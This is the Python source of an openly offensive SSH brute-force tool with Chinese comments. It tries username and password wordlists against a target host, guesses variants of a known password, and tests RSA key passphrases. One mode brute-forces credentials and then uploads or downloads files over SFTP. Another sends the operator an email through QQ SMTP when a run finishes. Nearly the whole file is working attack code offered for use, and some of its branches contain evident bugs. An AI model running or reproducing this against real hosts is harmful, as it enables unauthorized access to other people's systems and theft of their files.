# -*- coding: utf-8

import paramiko
import sys
import smtplib
import socket
import argparse
import random
import string
import os
import configparser
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from typing import Callable
import time

AUTHOR = "W01fh4cker"
REPO = "https://github.com/W01fh4cker/W01f-ssh-crack"
VERSION = "1.0"
MADETIME = "2022/4/13"
NOWTIME = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
SSH_LOGO = """
     ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
     ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
     ███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
     ╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
     ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""

# print logo and some information
print(fr"""
        {SSH_LOGO}
@Author: {AUTHOR}
@repo: {REPO}
@version: {VERSION}
@time: {MADETIME}  
@now: {NOWTIME}                     
""")

# re coding and fixing bugs by: [KOKOMI12345]Fuxuan(https://github.com/KOKOMI12345)

# 写一个根据密码格式生成类似格式的密码

def is_letter(s: str) -> bool:
    return s.isalpha()

def is_number(s: str) -> bool:
    return s.isdigit()

def is_special(s: str) -> bool:
    return s in "!@#$%^&*()_+-="

def is_upper(s: str) -> bool:
    return s.isupper()

def is_lower(s: str) -> bool:
    return s.islower()

def gress_password(old_password: str) -> str:
    # SSH爆破中,用于猜测密码的函数
    new_one = ''
    for char in old_password:
        if is_number(char):
            new_one += str(random.randint(0, 9))
        elif is_letter(char):
            if is_upper(char):
                new_one += random.choice(string.ascii_uppercase)
            else:
                new_one += random.choice(string.ascii_lowercase)
        elif is_special(char):
            new_one += random.choice("!@#$%^&*()_+-=")
        else:
            new_one += char
        
    return new_one


def parseArgs() -> tuple[str, str , str, int , str , str, str, int]:
    parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans、login、rsa-login")
    parser.add_argument('--stmpPath', type=str, default='data.conf', help="邮箱配置文件路径")
    parser.add_argument('--hostname', type=str, default='127.0.0.1', help="目标主机IP地址")
    parser.add_argument('--port', type=int, default=22, help="目标主机SSH端口")
    parser.add_argument('--username', type=str, default='root', help="目标主机用户名,如果你知道用户名，可以直接指定 (模式指定: login, rsa-login) ")
    parser.add_argument('--password', type=str, default='admin123456', help="目标主机密码,如果你知道密码，可以直接指定 (模式指定: login) ")
    parser.add_argument('--rsa_password', type=str, default=None, help="目标主机RSA私钥密码,同上所述 (模式指定: login, rsa-login) ")
    parser.add_argument('--guessNum', type=int, default=10, help="猜测次数, 默认为10次 (模式指定: guess) ")
    args = parser.parse_args()
    return args.mode , args.stmpPath, args.hostname, args.port, args.username, args.password, args.rsa_password , args.guessNum

def getConfig(section: str, key: str, stmpPathConf: str) -> str:
    config = configparser.ConfigParser()
    config.read(stmpPathConf)
    return config.get(section, key)

def Successed(username: str, password: str) -> None:
    print(f"[√]SSH连接成功! 账号: {username} 密码为：{password}")
    exit(0)

def Failed(reason: str) -> None:
    print(f"[×]SSH连接失败! 原因: {reason}")
    exit(1)

def PingIsOpenConnect(hostname: str, SSHport: int) -> bool:
    try:
        socket.setdefaulttimeout(1)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((hostname, SSHport))
        return True
    except Exception:
        return False

def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> tuple[bool,str,str]:
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        id_rsa_filePath = id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa'
        local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath, password=Rsa_password)
        ssh_client.connect(hostname, port=SSHport, username=username, pkey=local_key)
        return True , username, Rsa_password
    except Exception:
        return False , username, Rsa_password
    finally:
        ssh_client.close()

def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) -> tuple[bool,str,str]:
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(fr"[!]尝试账号: {username} 密码：{password}")
        ssh_client.connect(hostname, port=SSHport, username=username, password=password)
        return True , username, password
    except Exception:
        return False , username, password
    finally:
        ssh_client.close()

def TryRsaSSHLogin(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> None:
    if TryRsaSSHConnection(hostname, SSHport, username, id_rsa_filePath, Rsa_password)[0] is True:
        print(fr"[√]RSA-SSH登录成功! 账号: {username} 私钥密码为：{Rsa_password}")
        exit(0)
    else:
        print("[×]RSA-SSH登录失败")

def TrySSHLogin(hostname: str, SSHport: int, username: str, password: str) -> None:
    if TrySSHConnection(hostname, SSHport, username, password)[0] is True:
        Successed(username, password)
    else:
        print("[×]SSH登录失败")

def sshClientConnection(hostname:str, SSHport: int):
    if PingIsOpenConnect(hostname, SSHport) is False:
            Failed("目标主机未开启SSH服务")
    with open("username.txt", 'r', encoding='utf-8') as f:
        user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    for username in user_name:
        for password in pass_word:
            if TrySSHConnection(hostname, SSHport, username.strip(), password.strip())[0] is True:
                Successed(username.strip(), password.strip())
            else:
                continue
    Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。") # 由于succeed 函数会让程序退出，所以当所有登录尝试不成功的时候，这里就会被执行
    # 后面的同理

def sshRsaConnection(hostname: str, SSHport: int):
    if PingIsOpenConnect(hostname, SSHport) is False:
            Failed("目标主机未开启SSH服务")
    with open("username.txt", 'r', encoding='utf-8') as f:
            user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
    flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
    if(flag1 == 'y'):
        for Rsa_password in pass_word:
            for username in user_name:
                if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, Rsa_password.strip())[0] is True:
                    Successed(username.strip(), Rsa_password.strip())
                    break
                break
        Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
    elif(flag1 == 'n'):
        for username in user_name:
            if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, None)[0] is True:
                Successed(username.strip(), None)
                break
            break
        Failed("[x]所有的字典都尝试完毕，没有找到合适的账号。")
    else:
        print("您的输入有误！")

def sshGuess(hostname: str, SSHport: int, guessNum: int, username: str, password: str) -> None:
    if PingIsOpenConnect(hostname, SSHport) is False:
        Failed("目标主机未开启SSH服务")
    for i in range(guessNum):
        new_password = gress_password(password)
        if TrySSHConnection(hostname, SSHport, username, new_password)[0] is True:
            print(f"[√]猜测成功! 账号: {username} 密码为：{new_password}")
            exit(0)
        else:
            continue
    Failed("[x]所有的猜测都尝试完毕，没有找到合适的密码。")

def transFile(hostname: str, SSHport: int):
    if PingIsOpenConnect(hostname, SSHport) is False:
        Failed("目标主机未开启SSH服务")
    with open("username.txt", 'r', encoding='utf-8') as f:
        user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
    if(flag2==1):
        global p,q
        for username in user_name:
            for password in pass_word:
                try:
                    parameter = (hostname, SSHport)
                    trans = paramiko.Transport(parameter)
                    trans.connect(username=username, password=password)
                    sftp = paramiko.SFTPClient.from_transport(trans)
                    local_path = input("请输入您要上传的本地文件的绝对路径：")
                    remote_path = input("请输入您要上传的位置的绝对路径：")
                    try:
                        sftp.put(localpath=local_path, remotepath=remote_path)
                        print("[√]上传成功！")
                        print(fr"[√]连接成功！账号: {username} 密码为：{password}")
                        break
                    except Exception:
                        print("[×]上传失败。")
                        continue
                    finally:
                        trans.close()
                except Exception:
                    pass
    elif(flag2==2):
        for username in user_name:
            for password in pass_word:
                try:
                    parameter = (hostname, SSHport)
                    trans = paramiko.Transport(parameter)
                    trans.connect(username=username, password=password)
                    sftp = paramiko.SFTPClient.from_transport(trans)
                    local_path = input("请输入您要保存的位置的绝对路径：")
                    remote_path = input("请输入您要获取的文件的绝对路径：")
                    try:
                        sftp.get(localpath=local_path, remotepath=remote_path)
                        print("[√]下载成功！")
                    except Exception:
                        print("[×]下载失败。")
                        continue
                    finally:
                        trans.close()
                except Exception:
                    pass
    else:
        print("您的输入有误！")

def send_msg(stmpPath: str):
    server = "smtp.qq.com"
    port = 465
    sender = getConfig("data", "sender", stmpPath)
    pw = getConfig("data", "pw", stmpPath)
    receivers = getConfig("data", "receivers", stmpPath)
    machine_name = socket.gethostname()
    msg_root = MIMEMultipart('mixed')
    msg_root['From'] = Header(f'{machine_name} <{sender}>')
    msg_root['Subject'] = Header(f'Message from {machine_name}', 'utf-8')
    mail_msg = f"""
	<html>
	  <body>
	  <p>[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]<br>
		 Message from {machine_name}</p>
	<p>Path: {os.getcwd()}<br>
	   Args: {' '.join(sys.argv)}</p>
       您的扫描任务已经完成，如果觉得本软件还不错的话请给个star，谢谢您！
       仓库地址：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack
       有任何问题、建议，可以联系邮箱sharecat2022@gmail.com或者直接在github上面提出issues，地址为：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack/issues。感谢您的每一个建议！祝您生活愉快！                               From W01fh4cker
	</body>
	</html>"""

    msg_root.attach(MIMEText(mail_msg, 'html', 'utf-8'))

    smtp = smtplib.SMTP_SSL(server, port)
    smtp.login(sender, pw)
    smtp.sendmail(sender, receivers, msg_root.as_string())
    print("[√]发送成功")
    smtp.quit()

if __name__ == '__main__':

    def print_errormsg():
        IfError_Message = "请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！"
        print(IfError_Message)

    modeDict: dict[str, tuple[Callable]] = {
        'client': (sshClientConnection, send_msg),
        'rsa': (sshRsaConnection, send_msg),
        'trans': (transFile, send_msg),
        'login': (TrySSHLogin, send_msg),
        'rsa-login': (TryRsaSSHLogin, send_msg),
        'guess': (sshGuess, send_msg),
        'default': (print)
    }
      # 其实这里我本来想用 match case 语法，但是match case语法在python3.10之后才支持，所以我就用字典来代替了, 提升向后兼容性

    mode, stmpPath, hostname, SSHport, username, password, rsa_password, guessNum= parseArgs()
    print(f"[DEBUG] 模式：{mode}，目标主机：{hostname}, SSH端口: {SSHport}")
    if mode not in modeDict:
        modeDict['default'](f"模式{mode}不存在！")
        print(f"可指定模式: {list(modeDict.keys())}")
    else:
        try:
            if mode == "default":
                print("不允许指定预定模式! ")
                exit(1)
            if mode in ['client', 'rsa', 'trans']:
                print("[DEBUG] 5秒后开始爆破...")
                time.sleep(5)
                print("[DEBUG] 开始爆破")
                modeDict[mode][0](hostname.strip(), SSHport)
            if mode == 'login':
                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), password.strip())
            if mode == 'rsa-login':
                id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径:")
                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), id_rsa_filePath.strip(), rsa_password.strip())
            if mode == 'guess':
                old_password = input("请输入您要猜测的密码:")
                guessusername = input("请输入您要猜测的用户名:")
                modeDict[mode][0](hostname.strip(), SSHport, guessNum, guessusername.strip(), old_password.strip())
            if len(modeDict[mode]) > 1:
                modeDict[mode][1](stmpPath.strip())
        except Exception as e:
            print_errormsg()
            print(e)
        except KeyboardInterrupt:
            print("[!]用户中断！")
            exit(1)